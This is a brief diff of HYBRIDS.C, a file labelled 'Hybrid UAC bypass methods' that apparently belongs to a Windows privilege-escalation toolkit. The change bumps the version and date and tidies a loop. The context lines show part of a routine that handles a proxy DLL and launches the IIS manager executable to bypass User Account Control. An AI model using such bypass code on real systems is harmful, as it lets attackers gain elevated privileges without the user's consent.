@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.23
+*  VERSION:     3.24
 *
-*  DATE:        17 Dec 2019
+*  DATE:        20 Apr 2020
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1041,7 +1041,7 @@ BOOL ucmInetMgrFindCallback(
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL            bCond = FALSE, bSuccess = FALSE;
+    BOOL            bSuccess = FALSE;
     SIZE_T          l = 0;
     HANDLE          hFile = INVALID_HANDLE_VALUE, hFileMapping = NULL;
     PDWORD          MappedFile = NULL;
@@ -1151,7 +1151,7 @@ BOOL ucmInetMgrFindCallback(
         _strcat(szDest, INETMGR_EXE);
         bSuccess = supRunProcess(szDest, NULL);
 
-    } while (bCond);
+    } while (FALSE);
 
 
     if (MappedFile != NULL)
